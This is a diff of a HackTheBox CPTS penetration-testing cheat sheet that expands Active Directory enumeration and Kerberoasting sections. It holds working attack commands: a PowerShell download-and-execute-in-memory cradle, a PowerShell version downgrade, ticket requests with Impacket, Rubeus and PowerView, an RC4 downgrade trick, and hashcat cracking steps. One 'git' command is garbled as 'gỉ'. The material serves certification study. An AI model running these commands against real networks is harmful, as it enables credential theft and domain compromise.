@@ -74,7 +74,7 @@ HackTheBox Certified Penetration Tester Specialist Cheatsheet
     - [Credentialed Enumeration From Linux](#Credentialed-Enumeration-From-Linux)
     - [Credentialed Enumeration From Windows](#Credentialed-Enumeration-From-Windows)  
     - [Credentialed Enumeration From Windows with PowerView](#Credentialed-Enumeration-From-Windows-with-PowerView)  
-    - [Living Of The Land](#living-of-the-land)
+    - [Enumeration by Living Off the Land](#Enumeration-by-Living-Off-the-Land)
     - [Kerberoasting](#kerberoasting)
     - [ACL Enumeration & Tactics](#acl-enumeration-and-tactics)
     - [DCSync Attack](#dcsync-attack)
@@ -1440,7 +1440,9 @@ ConvertTo-SID
 # PowerView script used to request the kerberos ticket for a specified service principal name (SPN). Performed from a Windows-based host.
 Get-DomainSPNTicket
 
+____________________________________________
 (Domain/LDAP Functions)
+____________________________________________
 
 # PowerView script used tol return the AD object for the current (or specified) domain. Performed from a Windows-based host.
 Get-Domain
@@ -1472,15 +1474,18 @@ Get-DomainFileServer
 # PowerView script used to return a list of all distributed file systems for the current (or specified) domain. Performed from a Windows-based host.
 Get-DomainDFSShare
 
+____________________________________________
 (GPO Functions)
+____________________________________________
 
 # PowerView script used to return all GPOs or specific GPO objects in AD. Performed from a Windows-based host.
 Get-DomainGPO
 
 # PowerView script used to return the default domain policy or the domain controller policy for the current domain. Performed from a Windows-based host.
 Get-DomainPolicy
-
+____________________________________________
 (Computer Enumeration Functions)
+____________________________________________
 
 # PowerView script used to enumerate local groups on a local or remote machine. Performed from a Windows-based host.
 Get-NetLocalGroup
@@ -1497,7 +1502,9 @@ Get-NetSession
 # PowerView script used to test if the current user has administrative access to the local (or a remote) machine. Performed from a Windows-based host.
 Test-AdminAccess
 
+____________________________________________
 (Threaded 'Meta'-Functions)
+____________________________________________
 
 # PowerView script used to find machines where specific users are logged into. Performed from a Windows-based host.
 Find-DomainUserLocation
@@ -1511,7 +1518,9 @@ Find-InterestingDomainShareFile
 # PowerView script used to find machines on the local domain where the current user has local administrator access Performed from a Windows-based host.
 Find-LocalAdminAccess
 
+____________________________________________
 (Domain Trust Functions)
+____________________________________________
 
 # PowerView script that returns domain trusts for the current domain or a specified domain. Performed from a Windows-based host.
 Get-DomainTrust
@@ -1537,11 +1546,12 @@ Test-AdminAccess -ComputerName ACADEMY-EA-MS01
 # PowerView script used to find users on the target Windows domain that have the Service Principal Name set. Performed from a Windows-based host.
 Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
 ```
-##### Living Of The Land
+##### Enumeration by Living Off the Land
 ```
 ____________________________________________
 (Basic Enumeration Commands)
 ____________________________________________
+
 # Prints the PC's Name
 hostname
 
@@ -1565,9 +1575,11 @@ echo %USERDOMAIN%
 
 # Prints out the name of the Domain controller the host checks in with (ran from CMD-prompt)
 echo %logonserver%
+
 ____________________________________________
 (Harnessing PowerShell)
 ____________________________________________
+
 # Lists available modules loaded for use.
 Get-Module
 
@@ -1585,17 +1597,21 @@ Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_his
 
 # This is a quick and easy way to download a file from the web using PowerShell and call it from memory.
 powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); <follow-on commands>"
+
 ____________________________________________
 (Downgrade Powershell)
 ____________________________________________
+
 # Check your current PowerShell version and host information.
 Get-host
 
 # Revert your PowerShell session to version 2.0 (Downgrade Attack).
 powershell.exe -version 2
+
 ____________________________________________
 (Checking Defenses)
 ____________________________________________
+
 # Display the Windows Firewall status across all profiles.
 netsh advfirewall show allprofiles
 
@@ -1612,9 +1628,11 @@ Get-MpComputerStatus
 
 # This command displays a list of all currently active login (sessions) on the Windows system.
 qwinsta
+
 ____________________________________________
 (Network Information)
 ____________________________________________
+
 # Lists all known hosts stored in the arp table.
 arp -a
 
@@ -1626,10 +1644,12 @@ route print
 
 # 	Displays the status of the host's firewall. We can determine if it is active and filtering traffic.
 netsh advfirewall show allprofiles
+
 ____________________________________________
 (Windows Management Instrumentation (WMI))
 (https://gist.github.com/xorrior/67ee741af08cb1fc86511047550cdaf4)
 ____________________________________________
+
 # Prints the patch level and description of the Hotfixes applied
 wmic qfe get Caption,Description,HotFixID,InstalledOn
 
@@ -1650,9 +1670,11 @@ wmic group list /format:list
 
 # Dumps information about any system accounts that are being used as service accounts.
 wmic sysaccount list /format:list
+
 ____________________________________________
 (Net Commands)
 ____________________________________________
+
 # Display domain password & lockout policy
 net accounts /domain
 
@@ -1694,9 +1716,11 @@ net view \\<computername> /all
 
 # Mount a network share to a local drive letter
 net use x: \\<computername>\<sharename>
+
 ____________________________________________
 (Dsquery Commands)
 ____________________________________________
+
 # List all users in the current domain (DN format)
 dsquery user
 
@@ -1717,9 +1741,11 @@ dsquery user -inactive 4
 
 # Find disabled user accounts
 dsquery user -disabled
+
 ____________________________________________
 (LDAP OID Matching Rules)
 ____________________________________________
+
 # 1.2.840.113556.1.4.803 (LDAP_MATCHING_RULE_BIT_AND)
 # Meaning: Bitwise AND. Matches if the bit is EXACTLY set.
 # Use Case: Find accounts with a specific UAC flag (e.g., Only Disabled accounts).
@@ -1731,17 +1757,74 @@ ____________________________________________
 # 1.2.840.113556.1.4.1941 (LDAP_MATCHING_RULE_IN_CHAIN)
 # Meaning: Recursive lookups. Walks the lineage of an object.
 # Use Case: Find all members of a group, including those in Nested Groups.
+
+____________________________________________
+# (UAC Bitmask Cheat Sheet)
+____________________________________________
+
+# 2     : Account disabled
+# 32    : Password not required (Critical vulnerability!)
+# 512   : Normal account
+# 8192  : Domain Controller account
+# 65536 : Password never expires
+# 1048576 : Trusted for delegation (Constrained Delegation target)
+
+# Filter LDAP using OID 803 (Match exactly)
+
+# Find accounts with "Password Not Required" (Bit 32)
+dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=32)"
 ```
-##### Kerberoasting
+##### Kerberoasting 
 ```
+____________________________________________
+(Kerberoasting Prerequisites)
+____________________________________________
+
+# 1. Identity: Must have a valid Domain Identity (User/Pass, Hash, or active Shell).
+# 2. Scope: Any domain user can request a ticket for any SPN (even low-privilege users).
+# 3. Target: Must identify the Domain Controller (DC) IP to send LDAP/Kerberos queries.
+# 4. Tooling: Impacket (GetUserSPNs.py) for Linux or Rubeus/PowerView for Windows.
+
+____________________________________________
+(From Linux)
+____________________________________________
+
+============================================
+(Kerberoasting automate with impacket)  (using https://github.com/fortra/impacket)
+============================================
+
+# Used to install Impacket from inside the directory that gets cloned to the attack host. Performed from a Linux-based host.
+gỉ clone https://github.com/fortra/impacket 
+sudo python3 -m pip install .
+
+# Impacket tool used to get a list of SPNs on the target Windows domain from a Linux-based host.
+GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday
+
+# Impacket tool used to download/request (-request) all TGS tickets for offline processing from a Linux-based host.
+GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday -request
+
 # Impacket tool used to download/request a TGS ticket for a specific user account and write the ticket to a file (-outputfile sqldev_tgs) linux-based host.
 impacket-GetUserSPNs -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday -request-user sqldev -outputfile sqldev_tgs
- 
+
+# Attempts to crack the Kerberos (-m 13100) ticket hash (sqldev_tgs) using hashcat and a wordlist (rockyou.txt) from a Linux-based host.
+hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt --force
+
+____________________________________________
+(From Windows) 
+____________________________________________
+
+============================================
+(Kerberoasting manual with setspn.exe and mimikatz)
+============================================
+
+# Used to enumerate SPNs in a target Windows domain from a Windows-based host.
+setspn.exe -Q */*
+
+# Used to download/request all TGS tickets from a WIndows-based host.
+setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
+
 # PowerShell script used to download/request the TGS ticket of a specific user from a Windows-based host.
 Add-Type -AssemblyName System.IdentityModel New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
-
-# Cracking Kerberos ticket hash
-hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt --force
 
 # Mimikatz command that ensures TGS tickets are extracted in base64 format from a Windows-based host.
 mimikatz # base64 /out:true
@@ -1761,14 +1844,48 @@ python2.7 kirbi2john.py sqldev.kirbi
 # Used to modify the crack_file for Hashcat from a Linux-based host.
 sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
 
+# Used to crack the prepared Kerberos ticket hash (sqldev_tgs_hashcat) using a wordlist (rockyou.txt) from a Linux-based host.
+hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt
+
+============================================
+(Kerberoasting automate with PowerView) (https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1)
+============================================
+
 # Uses PowerView tool to extract TGS Tickets . Performed from a Windows-based host.
 Import-Module .\PowerView.ps1 Get-DomainUser * -spn | select samaccountname
 
 # PowerView tool used to download/request the TGS ticket of a specific ticket and automatically format it for Hashcat from a Windows-based host.
 Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
 
+# Exports all TGS tickets to a .CSV file (ilfreight_tgs.csv) from a Windows-based host.
+Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
+
+============================================
+(Kerberoasting automate with Rubeus) (https://github.com/GhostPack/Rubeus)
+============================================
+
+# Used to check the kerberoast stats (/stats) within the target Windows domain from a Windows-based host.
+.\Rubeus.exe kerberoast /stats
+
+# Used to request/download TGS tickets for accounts with the admin count set to 1 then formats the output in an easy to view & crack manner (/nowrap) . Performed from a Windows-based host.
+.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
+
 # Used to request/download a TGS ticket for a specific user (/user:testspn) the formats the output in an easy to view & crack manner (/nowrap). Performed from a Windows-based host.
 .\Rubeus.exe kerberoast /user:testspn /nowrap
+
+# Crack AES-256 encrypted Kerberos TGS tickets (etype 18)
+# Mode 19700 is slow but necessary for modern Windows environments (Server 2019+)
+hashcat -m 19700 <aes_hash_file> /usr/share/wordlists/rockyou.txt
+
+# Crack RC4 encrypted Kerberos TGS tickets (etype 23)
+# Mode 13100 is highly efficient and much faster than AES cracking
+hashcat -m 13100 <rc4_hash_file> /usr/share/wordlists/rockyou.txt
+
+# Perform Kerberoasting with Encryption Downgrade
+# /tgtdeleg: Forces RC4 encryption for easier offline cracking (works on Server 2016 and older)
+# /nowrap: Prevents base64 ticket blobs from being column-wrapped for easy copying
+.\Rubeus.exe kerberoast /tgtdeleg /user:<target_user> /nowrap
+
 ```
 
 ##### ACL Enumeration and Tactics
